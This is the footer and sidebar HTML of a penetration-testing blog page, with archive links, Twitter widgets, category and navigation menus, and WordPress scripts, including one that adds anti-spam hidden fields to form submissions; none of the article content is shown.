	<li><a href="https://www.n00py.io/2018/06/">June 2018</a></li>
	<li><a href="https://www.n00py.io/2018/04/">April 2018</a></li>
	<li><a href="https://www.n00py.io/2018/03/">March 2018</a></li>
	<li><a href="https://www.n00py.io/2018/01/">January 2018</a></li>
	<li><a href="https://www.n00py.io/2017/12/">December 2017</a></li>
	<li><a href="https://www.n00py.io/2017/11/">November 2017</a></li>
	<li><a href="https://www.n00py.io/2017/10/">October 2017</a></li>
	<li><a href="https://www.n00py.io/2017/09/">September 2017</a></li>
	<li><a href="https://www.n00py.io/2017/08/">August 2017</a></li>
	<li><a href="https://www.n00py.io/2017/06/">June 2017</a></li>
	<li><a href="https://www.n00py.io/2017/04/">April 2017</a></li>
	<li><a href="https://www.n00py.io/2017/03/">March 2017</a></li>
	<li><a href="https://www.n00py.io/2017/01/">January 2017</a></li>
	<li><a href="https://www.n00py.io/2016/10/">October 2016</a></li>
			</ul>

			</li>
<li id="twitter-follow-2" class="widget widget_twitter-follow"><div class="twitter-follow"><iframe id="twitter-widget-1" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" class="twitter-follow-button twitter-follow-button-rendered" style="position: absolute; visibility: hidden; width: 128px; height: 20px;" title="Twitter Follow Button" src="https://platform.twitter.com/widgets/follow_button.2f70fb173b9000da126c79afe2098f02.en.html#dnt=false&amp;id=twitter-widget-1&amp;lang=en&amp;partner=tfwp&amp;screen_name=n00py1&amp;show_count=false&amp;show_screen_name=true&amp;size=m&amp;time=1718452975303" data-screen-name="n00py1"></iframe><a href="https://twitter.com/intent/follow?screen_name=n00py1" class="twitter-follow-button" data-twitter-extracted-i1718452974236506262="true">Follow @n00py1</a></div></li>
<li id="twitter-timeline-profile-2" class="widget widget_twitter-timeline-profile"><div class="twitter-timeline-profile"><div class="twitter-timeline twitter-timeline-rendered" style="display: flex; max-width: 100%; margin-top: 0px; margin-bottom: 0px;"><iframe id="twitter-widget-0" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" class="" style="position: absolute; visibility: hidden; width: 0px; height: 0px; display: block; flex-grow: 1;" title="Twitter Timeline" src="https://syndication.twitter.com/srv/timeline-profile/screen-name/n00py1?dnt=false&amp;embedId=twitter-widget-0&amp;features=eyJ0ZndfdGltZWxpbmVfbGlzdCI6eyJidWNrZXQiOltdLCJ2ZXJzaW9uIjpudWxsfSwidGZ3X2ZvbGxvd2VyX2NvdW50X3N1bnNldCI6eyJidWNrZXQiOnRydWUsInZlcnNpb24iOm51bGx9LCJ0ZndfdHdlZXRfZWRpdF9iYWNrZW5kIjp7ImJ1Y2tldCI6Im9uIiwidmVyc2lvbiI6bnVsbH0sInRmd19yZWZzcmNfc2Vzc2lvbiI6eyJidWNrZXQiOiJvbiIsInZlcnNpb24iOm51bGx9LCJ0ZndfZm9zbnJfc29mdF9pbnRlcnZlbnRpb25zX2VuYWJsZWQiOnsiYnVja2V0Ijoib24iLCJ2ZXJzaW9uIjpudWxsfSwidGZ3X21peGVkX21lZGlhXzE1ODk3Ijp7ImJ1Y2tldCI6InRyZWF0bWVudCIsInZlcnNpb24iOm51bGx9LCJ0ZndfZXhwZXJpbWVudHNfY29va2llX2V4cGlyYXRpb24iOnsiYnVja2V0IjoxMjA5NjAwLCJ2ZXJzaW9uIjpudWxsfSwidGZ3X3Nob3dfYmlyZHdhdGNoX3Bpdm90c19lbmFibGVkIjp7ImJ1Y2tldCI6Im9uIiwidmVyc2lvbiI6bnVsbH0sInRmd19kdXBsaWNhdGVfc2NyaWJlc190b19zZXR0aW5ncyI6eyJidWNrZXQiOiJvbiIsInZlcnNpb24iOm51bGx9LCJ0ZndfdXNlX3Byb2ZpbGVfaW1hZ2Vfc2hhcGVfZW5hYmxlZCI6eyJidWNrZXQiOiJvbiIsInZlcnNpb24iOm51bGx9LCJ0ZndfdmlkZW9faGxzX2R5bmFtaWNfbWFuaWZlc3RzXzE1MDgyIjp7ImJ1Y2tldCI6InRydWVfYml0cmF0ZSIsInZlcnNpb24iOm51bGx9LCJ0ZndfbGVnYWN5X3RpbWVsaW5lX3N1bnNldCI6eyJidWNrZXQiOnRydWUsInZlcnNpb24iOm51bGx9LCJ0ZndfdHdlZXRfZWRpdF9mcm9udGVuZCI6eyJidWNrZXQiOiJvbiIsInZlcnNpb24iOm51bGx9fQ%3D%3D&amp;frame=false&amp;hideBorder=false&amp;hideFooter=false&amp;hideHeader=false&amp;hideScrollBar=false&amp;lang=en&amp;origin=https%3A%2F%2Fwww.n00py.io%2F2020%2F12%2Falternative-ways-to-pass-the-hash-pth%2F&amp;partner=tfwp&amp;sessionId=40e304f37cdc6a8e73caa790f00e695d51f6d84a&amp;showHeader=true&amp;showReplies=false&amp;siteScreenName=n00py1&amp;theme=dark&amp;transparent=false&amp;widgetsVersion=2615f7e52b7e0%3A1702314776716"></iframe></div><a class="twitter-timeline" data-lang="en" data-theme="dark" href="https://twitter.com/n00py1" data-twitter-extracted-i1718452974237289825="true">Tweets by n00py1</a></div></li>
</ul>
	</div>

</div>
	<div id="footer">
		<div class="container">
			<ul>
			<li id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3><form action="https://www.n00py.io" method="get"><label class="screen-reader-text" for="categories-dropdown-4">Categories</label><select name="cat" id="categories-dropdown-4" class="postform">
	<option value="-1">Select Category</option>
	<option class="level-0" value="15">Defense</option>
	<option class="level-0" value="9">Exploit</option>
	<option class="level-0" value="11">Incident Response</option>
	<option class="level-0" value="3">OSX</option>
	<option class="level-0" value="12">Pentesting</option>
	<option class="level-0" value="8">persistence</option>
	<option class="level-0" value="2">Post Exploitation</option>
	<option class="level-0" value="14">Research</option>
	<option class="level-0" value="1">Uncategorized</option>
	<option class="level-0" value="10">Vulnerability</option>
	<option class="level-0" value="13">Walkthrough</option>
</select>
</form>
<script type="text/javascript">
/* <![CDATA[ */
(function() {
	var dropdown = document.getElementById( "categories-dropdown-4" );
	function onCatChange() {
		if ( dropdown.options[ dropdown.selectedIndex ].value > 0 ) {
			dropdown.parentNode.submit();
		}
	}
	dropdown.onchange = onCatChange;
})();
/* ]]> */
</script>

			</li>
			</ul>
		</div>
	</div>
	<div id="sub-footer">
	<div class="container">
		<div class="sub-footer-left">
			<p>

			
			Copyright © 2024, n00py Blog. 

			</p>
		</div>

		<div class="sub-footer-right">
			<div class="menu"><ul>
<li><a href="https://www.n00py.io/">Home</a></li><li class="page_item page-item-602"><a href="https://www.n00py.io/defense/">Defense</a></li>
<li class="page_item page-item-16"><a href="https://www.n00py.io/github/">Github</a></li>
<li class="page_item page-item-61"><a href="https://www.n00py.io/linkedin/">LinkedIn</a></li>
<li class="page_item page-item-600"><a href="https://www.n00py.io/osx/">OSX</a></li>
<li class="page_item page-item-531"><a href="https://www.n00py.io/pentesting/">Pentesting</a></li>
<li class="page_item page-item-597"><a href="https://www.n00py.io/research/">Research</a></li>
<li class="page_item page-item-529"><a href="https://www.n00py.io/walkthroughs/">Walkthroughs</a></li>
<li class="page_item page-item-2"><a href="https://www.n00py.io/whoami/">whoami</a></li>
</ul></div>
		</div>
	</div>
</div>

</div>

<script type="text/javascript" id="mt-brushtypes-js-extra">
/* <![CDATA[ */
var MTBrushParams = {"baseUrl":"https:\/\/www.n00py.io\/wp-content\/plugins\/syntax-highlighter-mt"};
/* ]]> */
</script>
<script type="text/javascript" src="https://www.n00py.io/wp-content/plugins/syntax-highlighter-mt/brushTypes.js?ver=2.2.5" id="mt-brushtypes-js"></script>
<script type="text/javascript" src="https://www.n00py.io/wp-includes/js/comment-reply.min.js?ver=6.1.6" id="comment-reply-js"></script>
<script type="text/javascript" id="twitter-wjs-js-extra">
/* <![CDATA[ */
window.twttr=(function(w){t=w.twttr||{};t._e=[];t.ready=function(f){t._e.push(f);};return t;}(window));
/* ]]> */
</script>
<script type="text/javascript" id="twitter-wjs" async="" defer="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
	<script type="text/javascript">
        jQuery(document).ready(function ($) {
            //$( document ).ajaxStart(function() {
            //});

			
            for (var i = 0; i < document.forms.length; ++i) {
                var form = document.forms[i];
				if ($(form).attr("method") != "get") { $(form).append('<input type="hidden" name="tbQcSrRWyMVEodzT" value="U1VPM]T4sdujN0*E" />'); }
if ($(form).attr("method") != "get") { $(form).append('<input type="hidden" name="xFEl_hUPWTReGm" value="HtRLTw2OPWzaki" />'); }
if ($(form).attr("method") != "get") { $(form).append('<input type="hidden" name="zxjyXUZlKLpvgwRu" value="Hb8lXwF]pa5Y60qK" />'); }
            }

			
            $(document).on('submit', 'form', function () {
				if ($(this).attr("method") != "get") { $(this).append('<input type="hidden" name="tbQcSrRWyMVEodzT" value="U1VPM]T4sdujN0*E" />'); }
if ($(this).attr("method") != "get") { $(this).append('<input type="hidden" name="xFEl_hUPWTReGm" value="HtRLTw2OPWzaki" />'); }
if ($(this).attr("method") != "get") { $(this).append('<input type="hidden" name="zxjyXUZlKLpvgwRu" value="Hb8lXwF]pa5Y60qK" />'); }
                return true;
            });

			
            jQuery.ajaxSetup({
                beforeSend: function (e, data) {

                    //console.log(Object.getOwnPropertyNames(data).sort());
                    //console.log(data.type);

                    if (data.type !== 'POST') return;

                    if (typeof data.data === 'object' && data.data !== null) {
						data.data.append("tbQcSrRWyMVEodzT", "U1VPM]T4sdujN0*E");
data.data.append("xFEl_hUPWTReGm", "HtRLTw2OPWzaki");
data.data.append("zxjyXUZlKLpvgwRu", "Hb8lXwF]pa5Y60qK");
                    }
                    else {
                        data.data =  data.data + '&tbQcSrRWyMVEodzT=U1VPM]T4sdujN0*E&xFEl_hUPWTReGm=HtRLTw2OPWzaki&zxjyXUZlKLpvgwRu=Hb8lXwF]pa5Y60qK';
                    }
                }
            });

        });
	</script>
	


<iframe scrolling="no" frameborder="0" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.2f70fb173b9000da126c79afe2098f02.html?origin=https%3A%2F%2Fwww.n00py.io" title="Twitter settings iframe" style="display: none;"></iframe></body></html>